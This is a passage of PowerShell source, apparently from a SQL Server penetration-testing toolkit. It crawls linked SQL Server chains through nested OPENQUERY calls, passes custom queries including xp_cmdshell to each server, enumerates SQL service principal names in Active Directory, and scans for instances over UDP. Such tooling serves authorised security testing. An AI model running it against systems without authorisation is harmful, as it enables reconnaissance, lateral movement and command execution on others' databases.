        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Dedicated Administrator Connection (DAC).")]
        [Switch]$DAC,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [int]$TimeOut = 2,

        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run. If QueryTarget isn's given, this will run on each server.")]
        [string]$Query,

        [Parameter(Mandatory=$false,
        HelpMessage="Link to run SQL query on.")]
        [string]$QueryTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Convert collected data to exportable format.")]
        [switch]$Export
    )

    Begin
    {   
        $List = @()

        $Server = New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=@(); User=""; Sysadmin=""; CustomQuery=""}

        $List += $Server
        $SqlInfoTable = New-Object System.Data.DataTable
    }
    
    Process
    {
        $i=1
        while($i){
            $i--
            foreach($Server in $List){
                if($Server.Instance -eq "") {
                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query -QueryTarget $QueryTarget)
                    $i++

                    # Verbose output
                    Write-Verbose "--------------------------------"
                    Write-Verbose " Server: $($Server.Instance)"
                    Write-Verbose "--------------------------------"
                    Write-Verbose " - Link Path to server: $($Server.Path -join ' -> ')"                    
                    Write-Verbose " - Link Login: $($Server.User)"                                   
                    Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
                    Write-Verbose " - Link Count: $($Server.Links.Count)"                    
                    Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
                }   
            } 
        }

        if($Export){
            $LinkList = New-Object System.Data.Datatable
            [void]$LinkList.Columns.Add("Instance")
            [void]$LinkList.Columns.Add("Version")
            [void]$LinkList.Columns.Add("Path")
            [void]$LinkList.Columns.Add("Links")
            [void]$LinkList.Columns.Add("User")
            [void]$LinkList.Columns.Add("Sysadmin")
            [void]$LinkList.Columns.Add("CustomQuery")
            
            foreach($Server in $List){
                [void]$LinkList.Rows.Add($Server.instance,$Server.version,$Server.path -join " -> ", $Server.links -join ",", $Server.user, $Server.Sysadmin, $Server.CustomQuery -join ",")
            }

            return $LinkList
        } else {
            return $List
        }
    }
  
    End
    {
    }
}

Function Get-SQLServerLinkData{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Return the server objects identified during the server link crawl.  Link crawling is done via theGet-SQLServerLinkCrawl function.")]
        $List,
        
        [Parameter(Mandatory=$true,
        HelpMessage="Server object to be tested")]
        $Server,

        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run")]
        $Query,

        [Parameter(Mandatory=$false,
        HelpMessage="Target of custom SQL query to run")]
        $QueryTarget
    )

    Begin
    {
        $SqlInfoQuery = "select @@servername as servername, @@version as version, system_user as linkuser, is_srvrolemember('sysadmin') as role"
        $SqlLinksQuery = "select srvname from master..sysservers where dataaccess=1"
    }

    Process
    {
        $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlInfoQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
        if($SqlInfoTable.Servername -ne $null){
            $Server.Instance = $SqlInfoTable.Servername
            $Server.Version = [System.String]::Join("",(($SqlInfoTable.Version)[10..25]))
            $Server.Sysadmin = $sqlInfoTable.role
            $Server.User = $sqlInfoTable.linkuser
            
            if($List.Count -eq 1) { $Server.Path += ,$sqlInfoTable.servername }

            $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlLinksQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
            $Server.Links = [array]$SqlInfoTable.srvname

            if($Query -ne ""){
                if($QueryTarget -eq "" -or ($QueryTarget -ne "" -and $Server.Instance -eq $QueryTarget)){
                    if($Query -like '*xp_cmdshell*'){
                        $Query =  $Query + " WITH RESULT SETS ((output VARCHAR(8000)))"
                    }
                    if($Query -like '*xp_dirtree*'){
                        $Query = $Query + "  WITH RESULT SETS ((output VARCHAR(8000), depth int))"
                    }
                    $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
                    if($Query -like '*WITH RESULT SETS*'){
                        $Server.CustomQuery = $SqlInfoTable.output
                    } else {
                        $Server.CustomQuery = $SqlInfoTable
                    }
                }
            }

            if(($Server.Path | Sort-Object | Get-Unique).Count -eq ($Server.Path).Count){
                foreach($Link in $Server.Links){
                    $Linkpath = $Server.Path + $Link
                    $List += ,(New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=$Linkpath; User=""; Sysadmin=""; CustomQuery="" })
                }
            }
        } else {
            $Server.Instance = "Broken Link"
        }
        return $List
    }
}

Function Get-SQLServerLinkQuery{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL link path to crawl. This is used by Get-SQLServerLinkCrawl.")]
        $Path=@(),
        
        [Parameter(Mandatory=$false,
        HelpMessage="SQL query to build the crawl path around")]
        $Sql, 
        
        [Parameter(Mandatory=$false,
        HelpMessage="Counter to determine how many single quotes needed")]
        $Ticks=0

    )
    if ($Path.length -le 1){
        return($Sql -replace "'", ("'"*[Math]::pow(2,$Ticks)))
    } else {
        return("select * from openquery(`""+$Path[1]+"`","+"'"*[Math]::pow(2,$Ticks)+
        (Get-SQLServerLinkQuery -path $Path[1..($Path.Length-1)] -sql $Sql -ticks ($Ticks+1))+"'"*[Math]::pow(2,$Ticks)+")")
    }
}

Function Test-FolderWriteAccess
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        ValueFromPipeline = $true,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder you would like to test write access to.')]
        [string]$OutFolder
    )

    Process
    {
        # Create randomized 15 character file name
        $WriteTestFile = (-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_}))

        # Test Write Access
        Try { 
            write-output "test" | Out-File "$OutFolder\$WriteTestFile"
            rm "$OutFolder\$WriteTestFile"
            return $true
        }Catch{  
            return $false
        }
    }
}

function Get-DomainSpn
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$SpnService,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message 'Getting domain SPNs...'
        }

        # Setup table to store results
        $TableDomainSpn = New-Object -TypeName System.Data.DataTable
        $null = $TableDomainSpn.Columns.Add('UserSid')
        $null = $TableDomainSpn.Columns.Add('User')
        $null = $TableDomainSpn.Columns.Add('UserCn')
        $null = $TableDomainSpn.Columns.Add('Service')
        $null = $TableDomainSpn.Columns.Add('ComputerName')
        $null = $TableDomainSpn.Columns.Add('Spn')
        $null = $TableDomainSpn.Columns.Add('LastLogon')
        $null = $TableDomainSpn.Columns.Add('Description')
        $TableDomainSpn.Clear()
    }

    Process
    {

        try
        {
            # Setup LDAP filter
            $SpnFilter = ''

            if($DomainAccount)
            {
                $SpnFilter = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }

            if($ComputerName)
            {
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object -Process {
                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]$SidString = $SidBytes -replace ' ', ''
                #$Spn = $_.properties.serviceprincipalname[0].split(',')

                #foreach ($item in $Spn)
                foreach ($item in $($_.properties.serviceprincipalname))
                {
                    # Parse SPNs
                    $SpnServer = $item.split('/')[1].split(':')[0].split(' ')[0]
                    $SpnService = $item.split('/')[0]

                    # Parse last logon
                    if ($_.properties.lastlogon)
                    {
                        $LastLogon = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        $LastLogon = ''
                    }

                    # Add results to table
                    $null = $TableDomainSpn.Rows.Add(
                        [string]$SidString,
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$SpnService,
                        [string]$SpnServer,
                        [string]$item,
                        $LastLogon,
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$TableDomainSpnCount SPNs found on servers that matched search criteria."
            }
            Return $TableDomainSpn
        }
        else
        {
            Write-Verbose -Message '0 SPNs found.'
        }
    }
}


function Get-DomainObject
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$LdapFilter = '',

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$LdapPath,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$Limit = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$SearchScope = 'Subtree'
    )
    Begin
    {
        # Create PS Credential object
        if($Username -and $Password)
        {
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)
        }

        # Create Create the connection to LDAP
        if ($DomainController)
        {
           
            # Test credentials and grab domain
            try {

                $ArgumentList = New-Object Collections.Generic.List[string]
                $ArgumentList.Add("LDAP://$DomainController")

                if($Username){
                    $ArgumentList.Add($Credential.UserName)
                    $ArgumentList.Add($Credential.GetNetworkCredential().Password)
                }

                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList).distinguishedname

                # Authentication failed. distinguishedName property can not be empty.
                if(-not $objDomain){ throw }

            }catch{
                Write-Output "Authentication failed or domain controller is not reachable."
                Break
            }

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = '/'+$LdapPath+','+$objDomain
                $ArgumentList[0] = "LDAP://$DomainController$LdapPath"
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $ArgumentList
        }
        else
        {
            $objDomain = ([ADSI]'').distinguishedName

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+','+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }
            else
            {
                $objDomainPath  = [ADSI]''
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }

        # Setup LDAP filter
        $objSearcher.PageSize = $Limit
        $objSearcher.Filter = $LdapFilter
        $objSearcher.SearchScope = 'Subtree'
    }

    Process
    {
        try
        {
            # Return object
            $objSearcher.FindAll() | ForEach-Object -Process {
                $_
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
    }
}

Function  Get-SQLInstanceDomain
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$CheckMgmt,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Preforms a DNS lookup on the instance.')]
        [switch]$IncludeIP,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 3
    )

    Begin
    {
        # Table for SPN output
        $TblSQLServerSpns = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServerSpns.Columns.Add('ComputerName')
        $null = $TblSQLServerSpns.Columns.Add('Instance')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountSid')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccount')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountCn')
        $null = $TblSQLServerSpns.Columns.Add('Service')
        $null = $TblSQLServerSpns.Columns.Add('Spn')
        $null = $TblSQLServerSpns.Columns.Add('LastLogon')
        $null = $TblSQLServerSpns.Columns.Add('Description')

        if($IncludeIP)
        {
            $null = $TblSQLServerSpns.Columns.Add('IPAddress')
        }
        # Table for UDP scan results of management servers
    }

    Process
    {
        # Get list of SPNs for SQL Servers
        Write-Verbose -Message 'Grabbing SPNs from the domain for SQL Servers (MSSQL*)...'
        $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSSQL*' -SuppressVerbose | Where-Object -FilterScript {
            $_.service -like 'MSSQL*'
        }

        Write-Verbose -Message 'Parsing SQL Server instances from SPNs...'

        # Add column containing sql server instance
        $TblSQLServers |
        ForEach-Object -Process {
            # Parse SQL Server instance
            $Spn = $_.Spn
            $Instance = $Spn.split('/')[1].split(':')[1]

            # Check if the instance is a number and use the relevent delim
            $Value = 0
            if([int32]::TryParse($Instance,[ref]$Value))
            {
                $SpnServerInstance = $Spn -replace ':', ','
            }
            else
            {
                $SpnServerInstance = $Spn -replace ':', '\'
            }

            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/', ''

            $TableRow = @([string]$_.ComputerName,
                [string]$SpnServerInstance,
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
                [string]$_.Description)

            if($IncludeIP)
            {
                try 
                {
                    $IPAddress = [Net.DNS]::GetHostAddresses([String]$_.ComputerName).IPAddressToString
                    if($IPAddress -is [Object[]])
                    {
                        $IPAddress = $IPAddress -join ", "
                    }
                }
                catch 
                {
                    $IPAddress = "0.0.0.0"
                }
                $TableRow += $IPAddress
            }

            # Add SQL Server spn to table
            $null = $TblSQLServerSpns.Rows.Add($TableRow)
        }

        # Enumerate SQL Server instances from management servers
        if($CheckMgmt)
        {
            Write-Verbose -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'
            $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSServerClusterMgmtAPI' -SuppressVerbose |
            Where-Object -FilterScript {
                $_.ComputerName -like '*.*'
            } |
            Select-Object -Property ComputerName -Unique |
            Sort-Object -Property ComputerName

            Write-Verbose -Message 'Performing a UDP scan of management servers to obtain managed SQL Server instances...'
            $TblMgmtSQLServers = $TblMgmtServers |
            Select-Object -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }

    End
    {
        # Return data
        if($CheckMgmt)
        {
            Write-Verbose -Message 'Parsing SQL Server instances from the UDP scan...'
            $Tbl1 = $TblMgmtSQLServers |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl2 = $TblSQLServerSpns |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl3 = $Tbl1 + $Tbl2

            $InstanceCount = $Tbl3.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $Tbl3
        }
        else
        {
            $InstanceCount = $TblSQLServerSpns.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $TblSQLServerSpns
        }
    }
}

Function  Get-SQLInstanceLocal
{
   
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add('ComputerName')
        $null = $TblLocalInstances.Columns.Add('Instance')
        $null = $TblLocalInstances.Columns.Add('ServiceDisplayName')
        $null = $TblLocalInstances.Columns.Add('ServiceName')
        $null = $TblLocalInstances.Columns.Add('ServicePath')
        $null = $TblLocalInstances.Columns.Add('ServiceAccount')
        $null = $TblLocalInstances.Columns.Add('State')
    }

    Process
    {
        # Grab SQL Server services for the server
        $SqlServices = Get-SQLServiceLocal | Where-Object -FilterScript {
            $_.ServicePath -like '*sqlservr.exe*'
        }

        # Add recrds to SQL Server instance table
        $SqlServices |
        ForEach-Object -Process {
            # Parse Instance
            $ComputerName = [string]$_.ComputerName
            $DisplayName = [string]$_.ServiceDisplayName

            if($DisplayName)
            {
                $Instance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]
                if($Instance -like '*\MSSQLSERVER')
                {
                    $Instance = $ComputerName
                }
            }
            else
            {
                $Instance = $ComputerName
            }

            # Add record
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
            [string]$_.ServiceState)
        }
    }

    End
    {

        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count
        Write-Verbose -Message "$LocalInstanceCount local instances where found."

        # Return data
        $TblLocalInstances
    }
}


function Get-SQLInstanceScanUDP
{
    
    [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for results
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $TableResults.columns.add('ComputerName')
        $null = $TableResults.columns.add('Instance')
        $null = $TableResults.columns.add('InstanceName')
        $null = $TableResults.columns.add('ServerIP')
        $null = $TableResults.columns.add('TCPPort')
        $null = $TableResults.columns.add('BaseVersion')
        $null = $TableResults.columns.add('IsClustered')
    }

    Process
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Start."
        }

        # Verify server name isn't empty
        if ($ComputerName -ne '')
        {
            # Try to enumerate SQL Server instances from remote system
            try
            {
                # Resolve IP
                $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)

                # Create UDP client object
                $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient

                # Attempt to connect to system
                $UDPTimeOutMilsec = $UDPTimeOut * 1000
                $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                $UDPClient.Connect($ComputerName,0x59a)
                $UDPPacket = 0x03

                # Send request to system
                $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                $UDPClient.Client.Blocking = $true
                [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)

                # Process response from system
                $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                $values = @{}

                for($i = 0; $i -le $Response.length; $i++)
                {
                    if(![string]::IsNullOrEmpty($Response[$i]))
                    {
                        $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                    }
                    else
                    {
                        if(![string]::IsNullOrEmpty($values.'tcp'))
                        {
                            if(-not $SuppressVerbose)
                            {
                                $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                Write-Verbose -Message "$ComputerName - Found: $DiscoveredInstance"
                            }

                            # Add SQL Server instance info to results table
                            $null = $TableResults.rows.Add(
                                [string]$ComputerName,
                                [string]"$ComputerName\"+$values.'instancename',
                                [string]$values.'instancename',
                                [string]$IPAddress,
                                [string]$values.'tcp',
                                [string]$values.'version',
                            [string]$values.'isclustered')
                            $values = @{}
                        }
                    }
                }

                # Close connection
                $UDPClient.Close()
            }
            catch
            {
                #"Error was $_"
                #$line = $_.InvocationInfo.ScriptLineNumber
                #"Error was in Line $line"

                # Close connection
                # $UDPClient.Close()
            }
        }
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Complete."
        }
    }

    End
    {
        # Return Results
        $TableResults
    }
}


function Get-SQLInstanceBroadcast 
{
   
    [CmdletBinding()]
    Param(
            [Parameter(Mandatory = $false,
        HelpMessage = 'This will send a UDP request to each of the identified SQL Server instances to gather more information..')]
        [switch]$UDPPing
    )

    Begin
    {
        # Create data table for output
        $TblSQLServers = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServers.Columns.Add('ComputerName')
        $null = $TblSQLServers.Columns.Add('Instance')
        $null = $TblSQLServers.Columns.Add('IsClustered')
        $null = $TblSQLServers.Columns.Add('Version')        

        Write-Verbose "Attempting to identify SQL Server instances on the broadcast domain."
    }

    Process
    {
        try {

            # Discover instances
            $Instances = [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()

            # Add results to modified data table
            $Instances | 
            ForEach-Object {
                [string]$InstanceTemp =  $_.InstanceName
                if($InstanceTemp){
                    [string]$InstanceName = $_.Servername + "\" + $_.InstanceName
                }else{
                    [string]$InstanceName = $_.Servername 
                }
                [string]$ComputerName = $_.Servername
                [string]$IsClustered  = $_.IsClustered
                [string]$Version      = $_.Version

                # Add to table
                $TblSQLServers.Rows.Add($ComputerName, $InstanceName, $IsClustered, $Version) | Out-Null
            }
        }
        catch{

            # Show error message
            $ErrorMessage = $_.Exception.Message
            Write-Output -Message " Operation Failed."
            Write-Output -Message " Error: $ErrorMessage"     
        }
    }

    End
    {               
        # Get instance count
        $InstanceCount = $TblSQLServers.Rows.Count
        Write-Verbose "$InstanceCount SQL Server instances were found."
        
        # Get port and force engcryption flag
        if($UDPPing){
            Write-Verbose "Performing UDP ping against $InstanceCount SQL Server instances."
            $TblSQLServers |
            ForEach-Object{
                $CurrentComputer = $_.ComuterName                
                Get-SQLInstanceScanUDP -ComputerName $_.ComputerName -SuppressVerbose
            }
        }         

        # Return results
        if(-not $UDPPing){
            $TblSQLServers
        }
    }
}


function Get-SQLInstanceScanUDPThreaded
{
   [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for results
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $TableResults.columns.add('ComputerName')
        $null = $TableResults.columns.add('Instance')
        $null = $TableResults.columns.add('InstanceName')
        $null = $TableResults.columns.add('ServerIP')
        $null = $TableResults.columns.add('TCPPort')
        $null = $TableResults.columns.add('BaseVersion')
        $null = $TableResults.columns.add('IsClustered')
        $TableResults.Clear()

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # Ensure provide instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
            $PipelineItems = $PipelineItems + $ProvideInstance
        }
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $ComputerName = $_.ComputerName

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message " - $ComputerName - UDP Scan Start."
            }


            # Verify server name isn't empty
            if ($ComputerName -ne '')
            {
                # Try to enumerate SQL Server instances from remote system
                try
                {
                    # Resolve IP
                    $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)

                    # Create UDP client object
                    $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient

                    # Attempt to connect to system
                    $UDPTimeOutMilsec = $UDPTimeOut * 1000
                    $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                    $UDPClient.Connect($ComputerName,0x59a)
                    $UDPPacket = 0x03

                    # Send request to system
                    $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                    $UDPClient.Client.Blocking = $true
                    [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)

                    # Process response from system
                    $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                    $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                    $values = @{}

                    for($i = 0; $i -le $Response.length; $i++)
                    {
                        if(![string]::IsNullOrEmpty($Response[$i]))
                        {
                            $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                        }
                        else
                        {
                            if(![string]::IsNullOrEmpty($values.'tcp'))
                            {
                                if(-not $SuppressVerbose)
                                {
                                    $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                    Write-Verbose -Message " - $ComputerName - Found: $DiscoveredInstance"
                                }

                                # Add SQL Server instance info to results table
                                $null = $TableResults.rows.Add(
                                    [string]$ComputerName,
                                    [string]"$ComputerName\"+$values.'instancename',
                                    [string]$values.'instancename',
                                    [string]$IPAddress,
                                    [string]$values.'tcp',
                                    [string]$values.'version',
                                [string]$values.'isclustered')
                                $values = @{}
                            }
                        }
                    }

                    # Close connection
                    $UDPClient.Close()
                }
                catch
                {
                    #"Error was $_"
                    #$line = $_.InvocationInfo.ScriptLineNumber
                    #"Error was in Line $line"

                    # Close connection
                    # $UDPClient.Close()
                }
            }

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message " - $ComputerName - UDP Scan End."
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TableResults
    }
}

Function  Get-SQLInstanceFile
{
    <#
            .SYNOPSIS
            Returns a list of SQL Server instances from a file.
            One per line. Three instance formats supported:
            1 - computername
            2 - computername\instance
            3 - computername,1433
            .PARAMETER FilePath
            Path to file containing instances.  One per line.
            .EXAMPLE
            PS C:\> Get-SQLInstanceFile -Verbose -FilePath c:\temp\servers.txt
            VERBOSE: Importing instances from file path.
            VERBOSE: 3 instances where found in c:\temp\servers.txt.

            ComputerName   Instance
            ------------   --------
            Computer1      Computer1\SQLEXPRESS
            Computer1      Computer1\STANDARDDEV2014
            Computer1      Computer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true,
        HelpMessage = 'The file path.')]
